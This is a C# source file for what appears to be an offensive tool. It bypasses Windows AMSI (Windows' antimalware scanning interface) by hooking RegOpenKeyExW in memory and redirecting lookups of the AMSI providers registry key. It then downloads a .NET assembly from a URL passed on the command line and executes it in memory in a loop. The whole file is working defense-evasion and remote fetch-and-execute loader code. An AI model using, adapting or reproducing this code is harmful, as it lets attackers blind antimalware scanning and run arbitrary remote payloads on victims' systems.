using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;


public static class TrollDisappearKey
{

    [DllImport("KERNELBASE.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
    public delegate int delegateRegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    static NetHook hook1 = new NetHook();

    

    public static void DisappearKey()
    {
        delegateRegOpenKeyExW A = RegOpenKeyWDetour;

        //Replace assembly code for address at RegOpenKeyExW with tampoline to RegOpenKeyWDetour
        hook1.Install(hook1.GetProcAddress("KERNELBASE.dll", "RegOpenKeyExW"), Marshal.GetFunctionPointerForDelegate(A));
    }


    static private int RegOpenKeyWDetour(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult)
    {
        try
        {
            //set assembly code for address at RegOpenKeyExW back to original so that we can make the call
            //we are just tampering the query to lpSubKey
            hook1.Suspend();


            if (lpSubKey == @"Software\Microsoft\AMSI\Providers")
            {
                return RegOpenKeyExW(hKey, @"Software\Microsoft\AMSI\Providers ", ulOptions, samDesired, out phkResult);

            }

            return RegOpenKeyExW(hKey, lpSubKey, ulOptions, samDesired, out phkResult);

        }
        finally
        {
            //reinstall the hook
            hook1.Resume();

        }

    }


    public static void Main(string[] args)
    {
        //ignore tls errors
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

        //call the function to install the hook which essentially makes lpSubKey disappear
        //if first argument is passed as disabled, hook will not trigger
        if (args[1].Split(',')[0] != "disable") { 
        DisappearKey();
        }

        //standard assembly load .exe and call main with args
        ExecuteAssembly(new WebClient().DownloadData(args[0]), args[1]);
    }


    public static void ExecuteAssembly(Byte[] assemblyBytes, string comma_separated_args)
    {

        Assembly assembly = Assembly.Load(assemblyBytes);
        MethodInfo method = assembly.EntryPoint;

        object[] parameters = new object[] { comma_separated_args.Split(',') };
        string input = "";

        while (input != "exit")
        {

            method.Invoke(null, parameters);
            Console.Write("Pass in arguments comma delimited or type exit\r\n");
            input = Console.ReadLine();
            parameters = new object[] { input.Split(',') };

        }
    }
}


// shortened hooking library 
public class NetHook
{
    private int mOldMemoryProtect;
    private IntPtr mOldMethodAddress;
    private IntPtr mNewMethodAddress;
    private byte[] mOldMethodAsmCode;
    private byte[] mNewMethodAsmCode;
    public const int PAGE_EXECUTE_READWRITE = 64;

    public static readonly IntPtr NULL = IntPtr.Zero;

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, int flNewProtect, out int lpflOldProtect);

    public void Install(IntPtr oldMethodAddress, IntPtr newMethodAddress)
    {
        if (oldMethodAddress == NULL || newMethodAddress == NULL)
            throw new Exception("The address is invalid.");
        if (!VirtualProtect(oldMethodAddress, 12, PAGE_EXECUTE_READWRITE, out this.mOldMemoryProtect))
            throw new Exception("Unable to modify memory protection.");
        this.mOldMethodAddress = oldMethodAddress;
        this.mNewMethodAddress = newMethodAddress;
        this.mOldMethodAsmCode = this.GetHeadCode(this.mOldMethodAddress);
        this.mNewMethodAsmCode = this.ConvertToBinary((long)this.mNewMethodAddress);
        this.mNewMethodAsmCode = this.CombineOfArray(new byte[] { 0x48, 0xB8 }, this.mNewMethodAsmCode);
        this.mNewMethodAsmCode = this.CombineOfArray(this.mNewMethodAsmCode, new byte[] { 0x50, 0xC3 });
        if (!this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12))
            throw new Exception("Cannot be written to memory.");
    }

    public void Suspend()
    {
        if (this.mOldMethodAddress == NULL)
            throw new Exception("Unable to suspend.");
        this.WriteToMemory(this.mOldMethodAsmCode, this.mOldMethodAddress, 12);
    }

    public void Resume()
    {
        if (this.mOldMethodAddress == NULL)
            throw new Exception("Unable to resume.");
        this.WriteToMemory(this.mNewMethodAsmCode, this.mOldMethodAddress, 12);
    }

    private byte[] GetHeadCode(IntPtr ptr)
    {
        byte[] buffer = new byte[12];
        Marshal.Copy(ptr, buffer, 0, 12);
        return buffer;
    }
    private byte[] ConvertToBinary(long num)
    {
        byte[] buffer = new byte[8];
        IntPtr ptr = Marshal.AllocHGlobal(8);
        Marshal.WriteInt64(ptr, num);
        Marshal.Copy(ptr, buffer, 0, 8);
        Marshal.FreeHGlobal(ptr);
        return buffer;
    }
    private byte[] CombineOfArray(byte[] x, byte[] y)
    {
        int i = 0, len = x.Length;
        byte[] buffer = new byte[len + y.Length];
        while (i < len)
        {
            buffer[i] = x[i];
            i++;
        }
        while (i < buffer.Length)
        {
            buffer[i] = y[i - len];
            i++;
        }
        return buffer;
    }


    private bool WriteToMemory(byte[] buffer, IntPtr address, uint size)
    {
        try { Marshal.Copy(buffer, 0, address, 12); return true; } catch (Exception e) { return false; }

    }

    public IntPtr GetProcAddress(string strLibraryName, string strMethodName)
    {
        return GetProcAddress(GetModuleHandle(strLibraryName), strMethodName);
    }


}




